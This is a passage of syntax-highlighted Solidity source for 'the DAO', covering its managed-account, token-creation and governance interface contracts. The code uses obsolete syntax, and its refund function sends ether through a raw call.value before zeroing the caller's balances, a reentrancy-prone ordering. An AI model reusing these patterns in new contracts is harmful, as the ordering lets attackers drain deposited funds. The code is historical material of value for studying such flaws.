        <span class="n">allowed</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">][</span><span class="n">_spender</span><span class="p">]</span> <span class="o">=</span> <span class="n">_amount</span><span class="p">;</span>
        <span class="n">Approval</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">,</span> <span class="n">_spender</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">allowance</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_spender</span><span class="p">)</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">remaining</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">allowed</span><span class="p">[</span><span class="n">_owner</span><span class="p">][</span><span class="n">_spender</span><span class="p">];</span>
    <span class="p">}</span>
<span class="p">}</span>


<span class="cm">/*</span>
<span class="cm">This file is part of the DAO.</span>

<span class="cm">The DAO is free software: you can redistribute it and/or modify</span>
<span class="cm">it under the terms of the GNU lesser General Public License as published by</span>
<span class="cm">the Free Software Foundation, either version 3 of the License, or</span>
<span class="cm">(at your option) any later version.</span>

<span class="cm">The DAO is distributed in the hope that it will be useful,</span>
<span class="cm">but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
<span class="cm">MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
<span class="cm">GNU lesser General Public License for more details.</span>

<span class="cm">You should have received a copy of the GNU lesser General Public License</span>
<span class="cm">along with the DAO.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span>
<span class="cm">*/</span>


<span class="cm">/*</span>
<span class="cm">Basic account, used by the DAO contract to separately manage both the rewards </span>
<span class="cm">and the extraBalance accounts. </span>
<span class="cm">*/</span>

<span class="kd">contract</span> <span class="n">ManagedAccountInterface</span> <span class="p">{</span>
    <span class="c1">// The only address with permission to withdraw from this account</span>
    <span class="kt">address</span> <span class="kr">public</span> <span class="n">owner</span><span class="p">;</span>
    <span class="c1">// If true, only the owner of the account can receive ether from it</span>
    <span class="kt">bool</span> <span class="kr">public</span> <span class="n">payOwnerOnly</span><span class="p">;</span>
    <span class="c1">// The sum of ether (in wei) which has been sent to this contract</span>
    <span class="kt">uint</span> <span class="kr">public</span> <span class="n">accumulatedInput</span><span class="p">;</span>

    <span class="c1">/// </span><span class="cs">@notice</span><span class="c1"> Sends `_amount` of wei to _recipient</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _amount The amount of wei to send to `_recipient`</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _recipient The address to receive `_amount` of wei</span>
    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> True if the send completed</span>
    <span class="kd">function</span> <span class="n">payOut</span><span class="p">(</span><span class="kt">address</span> <span class="n">_recipient</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>

    <span class="kd">event</span> <span class="n">PayOut</span><span class="p">(</span><span class="kt">address</span> <span class="kr">indexed</span> <span class="n">_recipient</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_amount</span><span class="p">);</span>
<span class="p">}</span>


<span class="kd">contract</span> <span class="n">ManagedAccount</span> <span class="kr">is</span> <span class="n">ManagedAccountInterface</span><span class="p">{</span>

    <span class="c1">// The constructor sets the owner of the account</span>
    <span class="kd">function</span> <span class="n">ManagedAccount</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">_payOwnerOnly</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">owner</span> <span class="o">=</span> <span class="n">_owner</span><span class="p">;</span>
        <span class="n">payOwnerOnly</span> <span class="o">=</span> <span class="n">_payOwnerOnly</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// When the contract receives a transaction without data this is called. </span>
    <span class="c1">// It counts the amount of ether it receives and stores it in </span>
    <span class="c1">// accumulatedInput.</span>
    <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">accumulatedInput</span> <span class="o">+=</span> <span class="nb">msg.value</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">payOut</span><span class="p">(</span><span class="kt">address</span> <span class="n">_recipient</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">msg.sender</span> <span class="o">!=</span> <span class="n">owner</span> <span class="o">||</span> <span class="nb">msg.value</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="p">(</span><span class="n">payOwnerOnly</span> <span class="o">&amp;&amp;</span> <span class="n">_recipient</span> <span class="o">!=</span> <span class="n">owner</span><span class="p">))</span>
            <span class="k">throw</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">_recipient</span><span class="p">.</span><span class="nf">call</span><span class="p">.</span><span class="n">value</span><span class="p">(</span><span class="n">_amount</span><span class="p">)())</span> <span class="p">{</span>
            <span class="n">PayOut</span><span class="p">(</span><span class="n">_recipient</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cm">/*</span>
<span class="cm">This file is part of the DAO.</span>

<span class="cm">The DAO is free software: you can redistribute it and/or modify</span>
<span class="cm">it under the terms of the GNU lesser General Public License as published by</span>
<span class="cm">the Free Software Foundation, either version 3 of the License, or</span>
<span class="cm">(at your option) any later version.</span>

<span class="cm">The DAO is distributed in the hope that it will be useful,</span>
<span class="cm">but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
<span class="cm">MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
<span class="cm">GNU lesser General Public License for more details.</span>

<span class="cm">You should have received a copy of the GNU lesser General Public License</span>
<span class="cm">along with the DAO.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span>
<span class="cm">*/</span>


<span class="cm">/*</span>
<span class="cm"> * Token Creation contract, used by the DAO to create its tokens and initialize</span>
<span class="cm"> * its ether. Feel free to modify the divisor method to implement different</span>
<span class="cm"> * Token Creation parameters</span>
<span class="cm">*/</span>


<span class="kd">contract</span> <span class="n">TokenCreationInterface</span> <span class="p">{</span>

    <span class="c1">// End of token creation, in Unix time</span>
    <span class="kt">uint</span> <span class="kr">public</span> <span class="n">closingTime</span><span class="p">;</span>
    <span class="c1">// Minimum fueling goal of the token creation, denominated in tokens to</span>
    <span class="c1">// be created</span>
    <span class="kt">uint</span> <span class="kr">public</span> <span class="n">minTokensToCreate</span><span class="p">;</span>
    <span class="c1">// True if the DAO reached its minimum fueling goal, false otherwise</span>
    <span class="kt">bool</span> <span class="kr">public</span> <span class="n">isFueled</span><span class="p">;</span>
    <span class="c1">// For DAO splits - if privateCreation is 0, then it is a public token</span>
    <span class="c1">// creation, otherwise only the address stored in privateCreation is</span>
    <span class="c1">// allowed to create tokens</span>
    <span class="kt">address</span> <span class="kr">public</span> <span class="n">privateCreation</span><span class="p">;</span>
    <span class="c1">// hold extra ether which has been sent after the DAO token</span>
    <span class="c1">// creation rate has increased</span>
    <span class="n">ManagedAccount</span> <span class="kr">public</span> <span class="n">extraBalance</span><span class="p">;</span>
    <span class="c1">// tracks the amount of wei given from each contributor (used for refund)</span>
    <span class="kd">mapping</span> <span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="n">weiGiven</span><span class="p">;</span>

    <span class="c1">/// </span><span class="cs">@dev</span><span class="c1"> Constructor setting the minimum fueling goal and the</span>
    <span class="c1">/// end of the Token Creation</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _minTokensToCreate Minimum fueling goal in number of</span>
    <span class="c1">///        Tokens to be created</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _closingTime Date (in Unix time) of the end of the Token Creation</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _privateCreation Zero means that the creation is public.  A</span>
    <span class="c1">/// non-zero address represents the only address that can create Tokens</span>
    <span class="c1">/// (the address can also create Tokens on behalf of other accounts)</span>
    <span class="c1">// This is the constructor: it can not be overloaded so it is commented out</span>
    <span class="c1">//  function TokenCreation(</span>
        <span class="c1">//  uint _minTokensTocreate,</span>
        <span class="c1">//  uint _closingTime,</span>
        <span class="c1">//  address _privateCreation</span>
    <span class="c1">//  );</span>

    <span class="c1">/// </span><span class="cs">@notice</span><span class="c1"> Create Token with `_tokenHolder` as the initial owner of the Token</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _tokenHolder The address of the Tokens&#39;s recipient</span>
    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> Whether the token creation was successful</span>
    <span class="kd">function</span> <span class="n">createTokenProxy</span><span class="p">(</span><span class="kt">address</span> <span class="n">_tokenHolder</span><span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">);</span>

    <span class="c1">/// </span><span class="cs">@notice</span><span class="c1"> Refund `msg.sender` in the case the Token Creation did</span>
    <span class="c1">/// not reach its minimum fueling goal</span>
    <span class="kd">function</span> <span class="n">refund</span><span class="p">();</span>

    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> The divisor used to calculate the token creation rate during</span>
    <span class="c1">/// the creation phase</span>
    <span class="kd">function</span> <span class="n">divisor</span><span class="p">()</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">divisor</span><span class="p">);</span>

    <span class="kd">event</span> <span class="n">FuelingToDate</span><span class="p">(</span><span class="kt">uint</span> <span class="n">value</span><span class="p">);</span>
    <span class="kd">event</span> <span class="n">CreatedToken</span><span class="p">(</span><span class="kt">address</span> <span class="kr">indexed</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">);</span>
    <span class="kd">event</span> <span class="n">Refund</span><span class="p">(</span><span class="kt">address</span> <span class="kr">indexed</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">value</span><span class="p">);</span>
<span class="p">}</span>


<span class="kd">contract</span> <span class="n">TokenCreation</span> <span class="kr">is</span> <span class="n">TokenCreationInterface</span><span class="p">,</span> <span class="n">Token</span> <span class="p">{</span>
    <span class="kd">function</span> <span class="n">TokenCreation</span><span class="p">(</span>
        <span class="kt">uint</span> <span class="n">_minTokensToCreate</span><span class="p">,</span>
        <span class="kt">uint</span> <span class="n">_closingTime</span><span class="p">,</span>
        <span class="kt">address</span> <span class="n">_privateCreation</span><span class="p">)</span> <span class="p">{</span>

        <span class="n">closingTime</span> <span class="o">=</span> <span class="n">_closingTime</span><span class="p">;</span>
        <span class="n">minTokensToCreate</span> <span class="o">=</span> <span class="n">_minTokensToCreate</span><span class="p">;</span>
        <span class="n">privateCreation</span> <span class="o">=</span> <span class="n">_privateCreation</span><span class="p">;</span>
        <span class="n">extraBalance</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ManagedAccount</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="kc">true</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">createTokenProxy</span><span class="p">(</span><span class="kt">address</span> <span class="n">_tokenHolder</span><span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">now</span> <span class="o">&lt;</span> <span class="n">closingTime</span> <span class="o">&amp;&amp;</span> <span class="nb">msg.value</span> <span class="o">&gt;</span> <span class="mi">0</span>
            <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">privateCreation</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">privateCreation</span> <span class="o">==</span> <span class="nb">msg.sender</span><span class="p">))</span> <span class="p">{</span>

            <span class="kt">uint</span> <span class="n">token</span> <span class="o">=</span> <span class="p">(</span><span class="nb">msg.value</span> <span class="o">*</span> <span class="mi">20</span><span class="p">)</span> <span class="o">/</span> <span class="n">divisor</span><span class="p">();</span>
            <span class="n">extraBalance</span><span class="p">.</span><span class="nf">call</span><span class="p">.</span><span class="n">value</span><span class="p">(</span><span class="nb">msg.value</span> <span class="o">-</span> <span class="n">token</span><span class="p">)();</span>
            <span class="n">balances</span><span class="p">[</span><span class="n">_tokenHolder</span><span class="p">]</span> <span class="o">+=</span> <span class="n">token</span><span class="p">;</span>
            <span class="n">totalSupply</span> <span class="o">+=</span> <span class="n">token</span><span class="p">;</span>
            <span class="n">weiGiven</span><span class="p">[</span><span class="n">_tokenHolder</span><span class="p">]</span> <span class="o">+=</span> <span class="nb">msg.value</span><span class="p">;</span>
            <span class="n">CreatedToken</span><span class="p">(</span><span class="n">_tokenHolder</span><span class="p">,</span> <span class="n">token</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">totalSupply</span> <span class="o">&gt;=</span> <span class="n">minTokensToCreate</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">isFueled</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">isFueled</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
                <span class="n">FuelingToDate</span><span class="p">(</span><span class="n">totalSupply</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">throw</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">refund</span><span class="p">()</span> <span class="n">noEther</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">now</span> <span class="o">&gt;</span> <span class="n">closingTime</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">isFueled</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// Get extraBalance - will only succeed when called for the first time</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">extraBalance</span><span class="p">.</span><span class="nb">balance</span> <span class="o">&gt;=</span> <span class="n">extraBalance</span><span class="p">.</span><span class="n">accumulatedInput</span><span class="p">())</span>
                <span class="n">extraBalance</span><span class="p">.</span><span class="n">payOut</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">extraBalance</span><span class="p">.</span><span class="n">accumulatedInput</span><span class="p">());</span>

            <span class="c1">// Execute refund</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">msg.sender</span><span class="p">.</span><span class="nf">call</span><span class="p">.</span><span class="n">value</span><span class="p">(</span><span class="n">weiGiven</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">])())</span> <span class="p">{</span>
                <span class="n">Refund</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">,</span> <span class="n">weiGiven</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]);</span>
                <span class="n">totalSupply</span> <span class="o">-=</span> <span class="n">balances</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">];</span>
                <span class="n">balances</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="n">weiGiven</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">divisor</span><span class="p">()</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">divisor</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// The number of (base unit) tokens per wei is calculated</span>
        <span class="c1">// as `msg.value` * 20 / `divisor`</span>
        <span class="c1">// The fueling period starts with a 1:1 ratio</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">closingTime</span> <span class="o">-</span> <span class="mi">2</span> <span class="kc">weeks</span> <span class="o">&gt;</span> <span class="nb">now</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="mi">20</span><span class="p">;</span>
        <span class="c1">// Followed by 10 days with a daily creation rate increase of 5%</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">closingTime</span> <span class="o">-</span> <span class="mi">4</span> <span class="kc">days</span> <span class="o">&gt;</span> <span class="nb">now</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="p">(</span><span class="mi">20</span> <span class="o">+</span> <span class="p">(</span><span class="nb">now</span> <span class="o">-</span> <span class="p">(</span><span class="n">closingTime</span> <span class="o">-</span> <span class="mi">2</span> <span class="kc">weeks</span><span class="p">))</span> <span class="o">/</span> <span class="p">(</span><span class="mi">1</span> <span class="kc">days</span><span class="p">));</span>
        <span class="c1">// The last 4 days there is a constant creation rate ratio of 1:1.5</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="mi">30</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cm">/*</span>
<span class="cm">This file is part of the DAO.</span>

<span class="cm">The DAO is free software: you can redistribute it and/or modify</span>
<span class="cm">it under the terms of the GNU lesser General Public License as published by</span>
<span class="cm">the Free Software Foundation, either version 3 of the License, or</span>
<span class="cm">(at your option) any later version.</span>

<span class="cm">The DAO is distributed in the hope that it will be useful,</span>
<span class="cm">but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
<span class="cm">MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
<span class="cm">GNU lesser General Public License for more details.</span>

<span class="cm">You should have received a copy of the GNU lesser General Public License</span>
<span class="cm">along with the DAO.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span>
<span class="cm">*/</span>


<span class="cm">/*</span>
<span class="cm">Standard smart contract for a Decentralized Autonomous Organization (DAO)</span>
<span class="cm">to automate organizational governance and decision-making.</span>
<span class="cm">*/</span>


<span class="kd">contract</span> <span class="n">DAOInterface</span> <span class="p">{</span>

    <span class="c1">// The amount of days for which people who try to participate in the</span>
    <span class="c1">// creation by calling the fallback function will still get their ether back</span>
    <span class="kt">uint</span> <span class="kr">constant</span> <span class="n">creationGracePeriod</span> <span class="o">=</span> <span class="mi">40</span> <span class="kc">days</span><span class="p">;</span>
    <span class="c1">// The minimum debate period that a generic proposal can have</span>
    <span class="kt">uint</span> <span class="kr">constant</span> <span class="n">minProposalDebatePeriod</span> <span class="o">=</span> <span class="mi">2</span> <span class="kc">weeks</span><span class="p">;</span>
    <span class="c1">// The minimum debate period that a split proposal can have</span>
    <span class="kt">uint</span> <span class="kr">constant</span> <span class="n">minSplitDebatePeriod</span> <span class="o">=</span> <span class="mi">1</span> <span class="kc">weeks</span><span class="p">;</span>
    <span class="c1">// Period of days inside which it&#39;s possible to execute a DAO split</span>
    <span class="kt">uint</span> <span class="kr">constant</span> <span class="n">splitExecutionPeriod</span> <span class="o">=</span> <span class="mi">27</span> <span class="kc">days</span><span class="p">;</span>
    <span class="c1">// Period of time after which the minimum Quorum is halved</span>
    <span class="kt">uint</span> <span class="kr">constant</span> <span class="n">quorumHalvingPeriod</span> <span class="o">=</span> <span class="mi">25</span> <span class="kc">weeks</span><span class="p">;</span>
    <span class="c1">// Period after which a proposal is closed</span>
    <span class="c1">// (used in the case `executeProposal` fails because it throws)</span>
    <span class="kt">uint</span> <span class="kr">constant</span> <span class="n">executeProposalPeriod</span> <span class="o">=</span> <span class="mi">10</span> <span class="kc">days</span><span class="p">;</span>
    <span class="c1">// Denotes the maximum proposal deposit that can be given. It is given as</span>
    <span class="c1">// a fraction of total Ether spent plus balance of the DAO</span>
    <span class="kt">uint</span> <span class="kr">constant</span> <span class="n">maxDepositDivisor</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>

    <span class="c1">// Proposals to spend the DAO&#39;s ether or to choose a new Curator</span>
    <span class="n">Proposal</span><span class="p">[]</span> <span class="kr">public</span> <span class="n">proposals</span><span class="p">;</span>
    <span class="c1">// The quorum needed for each proposal is partially calculated by</span>
    <span class="c1">// totalSupply / minQuorumDivisor</span>
    <span class="kt">uint</span> <span class="kr">public</span> <span class="n">minQuorumDivisor</span><span class="p">;</span>
    <span class="c1">// The unix time of the last time quorum was reached on a proposal</span>
    <span class="kt">uint</span>  <span class="kr">public</span> <span class="n">lastTimeMinQuorumMet</span><span class="p">;</span>

    <span class="c1">// Address of the curator</span>
    <span class="kt">address</span> <span class="kr">public</span> <span class="n">curator</span><span class="p">;</span>
    <span class="c1">// The whitelist: List of addresses the DAO is allowed to send ether to</span>
    <span class="kd">mapping</span> <span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">bool</span><span class="p">)</span> <span class="kr">public</span> <span class="n">allowedRecipients</span><span class="p">;</span>

    <span class="c1">// Tracks the addresses that own Reward Tokens. Those addresses can only be</span>
    <span class="c1">// DAOs that have split from the original DAO. Conceptually, Reward Tokens</span>
    <span class="c1">// represent the proportion of the rewards that the DAO has the right to</span>
    <span class="c1">// receive. These Reward Tokens are generated when the DAO spends ether.</span>
    <span class="kd">mapping</span> <span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint</span><span class="p">)</span> <span class="kr">public</span> <span class="n">rewardToken</span><span class="p">;</span>
    <span class="c1">// Total supply of rewardToken</span>
    <span class="kt">uint</span> <span class="kr">public</span> <span class="n">totalRewardToken</span><span class="p">;</span>

    <span class="c1">// The account used to manage the rewards which are to be distributed to the</span>
    <span class="c1">// DAO Token Holders of this DAO</span>
    <span class="n">ManagedAccount</span> <span class="kr">public</span> <span class="n">rewardAccount</span><span class="p">;</span>

    <span class="c1">// The account used to manage the rewards which are to be distributed to</span>
    <span class="c1">// any DAO that holds Reward Tokens</span>
    <span class="n">ManagedAccount</span> <span class="kr">public</span> <span class="n">DAOrewardAccount</span><span class="p">;</span>

    <span class="c1">// Amount of rewards (in wei) already paid out to a certain DAO</span>
    <span class="kd">mapping</span> <span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint</span><span class="p">)</span> <span class="kr">public</span> <span class="n">DAOpaidOut</span><span class="p">;</span>

    <span class="c1">// Amount of rewards (in wei) already paid out to a certain address</span>
    <span class="kd">mapping</span> <span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint</span><span class="p">)</span> <span class="kr">public</span> <span class="n">paidOut</span><span class="p">;</span>
    <span class="c1">// Map of addresses blocked during a vote (not allowed to transfer DAO</span>
    <span class="c1">// tokens). The address points to the proposal ID.</span>
    <span class="kd">mapping</span> <span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint</span><span class="p">)</span> <span class="kr">public</span> <span class="n">blocked</span><span class="p">;</span>

    <span class="c1">// The minimum deposit (in wei) required to submit any proposal that is not</span>
    <span class="c1">// requesting a new Curator (no deposit is required for splits)</span>
    <span class="kt">uint</span> <span class="kr">public</span> <span class="n">proposalDeposit</span><span class="p">;</span>

    <span class="c1">// the accumulated sum of all current proposal deposits</span>
    <span class="kt">uint</span> <span class="n">sumOfProposalDeposits</span><span class="p">;</span>

    <span class="c1">// Contract that is able to create a new DAO (with the same code as</span>
    <span class="c1">// this one), used for splits</span>
    <span class="n">DAO_Creator</span> <span class="kr">public</span> <span class="n">daoCreator</span><span class="p">;</span>

    <span class="c1">// A proposal with `newCurator == false` represents a transaction</span>
    <span class="c1">// to be issued by this DAO</span>
    <span class="c1">// A proposal with `newCurator == true` represents a DAO split</span>
    <span class="kd">struct</span> <span class="n">Proposal</span> <span class="p">{</span>
        <span class="c1">// The address where the `amount` will go to if the proposal is accepted</span>
        <span class="c1">// or if `newCurator` is true, the proposed Curator of</span>
        <span class="c1">// the new DAO).</span>
        <span class="kt">address</span> <span class="n">recipient</span><span class="p">;</span>
        <span class="c1">// The amount to transfer to `recipient` if the proposal is accepted.</span>
        <span class="kt">uint</span> <span class="n">amount</span><span class="p">;</span>
        <span class="c1">// A plain text description of the proposal</span>
        <span class="kt">string</span> <span class="n">description</span><span class="p">;</span>
        <span class="c1">// A unix timestamp, denoting the end of the voting period</span>
        <span class="kt">uint</span> <span class="n">votingDeadline</span><span class="p">;</span>
        <span class="c1">// True if the proposal&#39;s votes have yet to be counted, otherwise False</span>
        <span class="kt">bool</span> <span class="n">open</span><span class="p">;</span>
        <span class="c1">// True if quorum has been reached, the votes have been counted, and</span>
        <span class="c1">// the majority said yes</span>
        <span class="kt">bool</span> <span class="n">proposalPassed</span><span class="p">;</span>
        <span class="c1">// A hash to check validity of a proposal</span>
        <span class="kt">bytes32</span> <span class="n">proposalHash</span><span class="p">;</span>
        <span class="c1">// Deposit in wei the creator added when submitting their proposal. It</span>
        <span class="c1">// is taken from the msg.value of a newProposal call.</span>
        <span class="kt">uint</span> <span class="n">proposalDeposit</span><span class="p">;</span>
        <span class="c1">// True if this proposal is to assign a new Curator</span>
        <span class="kt">bool</span> <span class="n">newCurator</span><span class="p">;</span>
        <span class="c1">// Data needed for splitting the DAO</span>
        <span class="n">SplitData</span><span class="p">[]</span> <span class="n">splitData</span><span class="p">;</span>
        <span class="c1">// Number of Tokens in favor of the proposal</span>
        <span class="kt">uint</span> <span class="n">yea</span><span class="p">;</span>
        <span class="c1">// Number of Tokens opposed to the proposal</span>
        <span class="kt">uint</span> <span class="n">nay</span><span class="p">;</span>
        <span class="c1">// Simple mapping to check if a shareholder has voted for it</span>
        <span class="kd">mapping</span> <span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">bool</span><span class="p">)</span> <span class="n">votedYes</span><span class="p">;</span>
        <span class="c1">// Simple mapping to check if a shareholder has voted against it</span>
        <span class="kd">mapping</span> <span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">bool</span><span class="p">)</span> <span class="n">votedNo</span><span class="p">;</span>
        <span class="c1">// Address of the shareholder who created the proposal</span>
        <span class="kt">address</span> <span class="n">creator</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Used only in the case of a newCurator proposal.</span>
    <span class="kd">struct</span> <span class="n">SplitData</span> <span class="p">{</span>
        <span class="c1">// The balance of the current DAO minus the deposit at the time of split</span>
        <span class="kt">uint</span> <span class="n">splitBalance</span><span class="p">;</span>
        <span class="c1">// The total amount of DAO Tokens in existence at the time of split.</span>
        <span class="kt">uint</span> <span class="n">totalSupply</span><span class="p">;</span>
        <span class="c1">// Amount of Reward Tokens owned by the DAO at the time of split.</span>
        <span class="kt">uint</span> <span class="n">rewardToken</span><span class="p">;</span>
        <span class="c1">// The new DAO contract created at the time of split.</span>
        <span class="n">DAO</span> <span class="n">newDAO</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Used to restrict access to certain functions to only DAO Token Holders</span>
    <span class="kd">modifier</span> <span class="n">onlyTokenholders</span> <span class="p">{}</span>

    <span class="c1">/// </span><span class="cs">@dev</span><span class="c1"> Constructor setting the Curator and the address</span>
    <span class="c1">/// for the contract able to create another DAO as well as the parameters</span>
    <span class="c1">/// for the DAO Token Creation</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _curator The Curator</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _daoCreator The contract able to (re)create this DAO</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _proposalDeposit The deposit to be paid for a regular proposal</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _minTokensToCreate Minimum required wei-equivalent tokens</span>
    <span class="c1">///        to be created for a successful DAO Token Creation</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _closingTime Date (in Unix time) of the end of the DAO Token Creation</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _privateCreation If zero the DAO Token Creation is open to public, a</span>
    <span class="c1">/// non-zero address means that the DAO Token Creation is only for the address</span>
    <span class="c1">// This is the constructor: it can not be overloaded so it is commented out</span>
    <span class="c1">//  function DAO(</span>
        <span class="c1">//  address _curator,</span>
        <span class="c1">//  DAO_Creator _daoCreator,</span>
        <span class="c1">//  uint _proposalDeposit,</span>
        <span class="c1">//  uint _minTokensToCreate,</span>
        <span class="c1">//  uint _closingTime,</span>
        <span class="c1">//  address _privateCreation</span>
    <span class="c1">//  );</span>

    <span class="c1">/// </span><span class="cs">@notice</span><span class="c1"> Create Token with `msg.sender` as the beneficiary</span>
    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> Whether the token creation was successful</span>
    <span class="kd">function</span> <span class="p">()</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">);</span>


    <span class="c1">/// </span><span class="cs">@dev</span><span class="c1"> This function is used to send ether back</span>
    <span class="c1">/// to the DAO, it can also be used to receive payments that should not be</span>
    <span class="c1">/// counted as rewards (donations, grants, etc.)</span>
    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> Whether the DAO received the ether successfully</span>
    <span class="kd">function</span> <span class="n">receiveEther</span><span class="p">()</span> <span class="k">returns</span><span class="p">(</span><span class="kt">bool</span><span class="p">);</span>

